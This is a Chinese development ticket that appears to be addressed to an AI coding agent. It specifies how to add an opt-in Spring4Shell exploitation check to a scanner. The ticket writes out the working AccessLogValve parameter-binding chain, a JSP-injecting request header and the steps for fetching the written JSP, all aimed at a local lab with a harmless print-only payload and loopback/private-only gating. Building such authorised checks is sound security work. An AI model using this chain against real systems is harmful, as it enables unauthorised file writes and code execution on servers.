# 工单 F8：Spring4Shell 真实利用能力（opt-in）

> 执行者：opencode。验收者：lead。
> 工作区 `D:\HZR_PROJECTS\ruoyi-scan-p1`（feat/p1-blindtest，HEAD `71ff0e6`）。
> **默认扫描绝不写目标文件；只有显式 `--exploit` 且目标是回环/内网才执行利用链。**

---

## 零、背景（lead 已在靶场验证）

C2-2（`http://127.0.0.1:19313/`，Spring MVC 5.3.17 + Tomcat 9.0.58 + JDK17）
真实可利用，链条已手工跑通：

1. `POST /device/add` 绑定：
   ```
   class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i
   class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
   class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
   class.module.classLoader.resources.context.parent.pipeline.first.prefix=s4s<rand>
   class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
   ```
2. `GET /?x=1`，请求头 `prefix: <% out.print(652187); %>`
3. 等 **约 10 秒**（AccessLogValve 有缓冲），`GET /s4s<rand>.jsp` → 返回 `652187`。
4. 坑：header 里的双引号会被 AccessLogValve 转义成 `\"`，JSP 编译 500。
   **payload 必须用数字、不带引号**。

当前插件只会“表单可达 → UNKNOWN”，没有利用能力。本单补上。

---

## 一、开关与安全边界

1. CLI 新增 `--exploit`（store_true，默认 False），help 文案：
   ```
   仅用于已授权目标：对 Spring4Shell 做真实利用验证（会写入一个无害 JSP）。
   默认关闭；非回环/内网目标自动拒绝。
   ```
2. `ScanRequest` 增加 `exploit: bool = False`，`_build_scan_request` 从 args 透传。
3. 会话上暴露开关：`SessionManager` 增加属性 `exploit`（默认 False），
   orchestrator 创建 session 时赋值 `session.exploit = req.exploit`。
   插件通过 `getattr(session, "exploit", False)` 读取，不直接依赖 CLI。
4. 插件内二次校验目标：
   - `localhost`、`127.0.0.1`、`::1` → 允许
   - 字面 IP 且 `ipaddress.ip_address(host).is_private` → 允许
   - 其它（域名、公网 IP）→ 返回 UNKNOWN，evidence 写
     “目标不是回环/内网地址，--exploit 已拒绝执行”，**不发任何写请求**
5. 每次扫描最多尝试 1 次利用，不重试、不遍历多个 action。

---

## 二、插件实现（`plugins/spring/spring4shell.py`）

保留现有第一阶段（表单发现、marker 判定、根路径 405 → UNKNOWN）。
在“表单 action 可达”分支之后、返回 UNKNOWN 之前，插入真实利用：

```
if not session.exploit: 保持现状（UNKNOWN，表单可达）
if not _exploit_allowed(target): 返回 UNKNOWN（拒绝原因）
action = 第一个可达的 form action；没有则用根路径（若根路径 POST 不是 405）
```

利用步骤：

1. `name = "s4s" + 6 位随机数字`；`num = 6 位随机数字`；
   `code = "<% out.print(%d); %>" % num`（**无引号**）。
2. 绑定参数（见上）发到 action；要求 HTTP 200，否则 UNKNOWN
   （“绑定被拒绝，疑似已打补丁/被 WAF 拦截”）。
3. 发 `GET {target}/?s4s=1`，header `prefix: code`。
4. 轮询 `GET {target}/{name}.jsp`，1 秒一次，最多 **15 秒**：
   - 200 且正文含 `str(num)` → **CONFIRMED**
     evidence：`写入 JSP 并执行成功：/{name}.jsp 返回标记 {num}（payload 仅 out.print，无命令执行）`
   - 超时/404/正文不含 → UNKNOWN，evidence 写明“绑定成功但未取到标记（可能被 WAF/权限拦截）”
5. 清理（best effort，失败不影响结论）：
   - 把 valve 改回默认：
     `pattern=%h %l %u %t "%r" %s %b`、`suffix=.txt`、`directory=logs`、
     `prefix=localhost_access_log`、`fileDateFormat=.yyyy-MM-dd`
   - 远端无法删除已写入的 JSP，evidence 里注明“遗留文件 /{name}.jsp，内容仅打印数字”。
6. 任何一步异常 → UNKNOWN，不许崩、不许把异常吞成 SAFE。

---

## 三、测试（`tests/test_f8_spring4shell_exploit.py`）

用 fake session / monkeypatch，不依赖真实靶场：

1. `session.exploit=False`：不出现 valve 参数请求，表单可达 → UNKNOWN
2. `session.exploit=True` + 回环目标 + 绑定 200 + JSP 首次 200 含 num → CONFIRMED
3. `session.exploit=True` + 公网 IP → UNKNOWN，且没有任何含 `class.module` 的请求
4. 绑定返回 400 → UNKNOWN（不打补丁目标不写文件）
5. JSP 轮询 15 秒超时 → UNKNOWN（用 monkeypatch 时间/次数，别真等）
6. 清理请求确实把 `directory=logs`、`suffix=.txt` 发回去
7. 现有 `test_f7_spring4shell_form.py` 与 `test_fp_baseline.py` 不退化

---

## 四、门禁

```
"D:\tools\Python 3.12.9\python.exe" -m pytest tests/test_f8_spring4shell_exploit.py tests/test_f7_spring4shell_form.py tests/test_fp_baseline.py tests/test_d7_plugins.py tests/test_session_isolation_gate.py tests/test_logging_hygiene.py -q
"D:\tools\Python 3.12.9\python.exe" -m ruff check core/ plugins/ tests/ cli/
"D:\tools\Python 3.12.9\python.exe" -m ruff format --check core/ plugins/ cli/
"D:\tools\Python 3.12.9\python.exe" -m mypy core/ --strict --ignore-missing-imports --no-warn-unused-ignores
"D:\tools\Python 3.12.9\python.exe" tests/regression_ruoyi.py
```

全绿。

---

## 五、靶场验收（C2-2）

启动：`python scripts\c2_s4s.py start`（`C:\Users\HZR\Desktop\若依系统`）。

1. **默认**：
   ```
   python main.py -u http://127.0.0.1:19313 --report artifacts/f8/default --no-pause --no-cta
   ```
   期望：Spring4Shell = UNKNOWN；`tools\tomcat-9.0.58-s4s\webapps\ROOT` 下**没有新增 s4s*.jsp**。

2. **开启利用**：
   ```
   python main.py -u http://127.0.0.1:19313 --exploit --report artifacts/f8/exploit --no-pause --no-cta
   ```
   期望：Spring4Shell = **CONFIRMED**，evidence 含“写入 JSP 并执行成功”和随机数字；
   扫描期间 ROOT 下短暂出现 `s4s*.jsp`，扫描结束后 valve 已恢复默认。

3. **公网拒绝**（不实际发包）：
   ```
   python main.py -u http://8.8.8.8 --exploit --timeout 2 --report artifacts/f8/public --no-pause --no-cta
   ```
   期望：UNKNOWN，evidence 含“不是回环/内网地址”，无 `class.module` 请求。

4. 扫描后把 C2-2 停掉，清理测试 JSP（`rm tools\tomcat-9.0.58-s4s\webapps\ROOT\s4s*.jsp`）。

---

## 六、停点

1. 贴 7 条测试结果与门禁输出。
2. 贴三次扫描的 Spring4Shell 状态与 evidence。
3. 贴 `--help` 里 `--exploit` 的文案。
4. 贴 `git status --short`（只允许本单相关文件）。
5. **不 commit；不碰其他插件；不改靶场。**
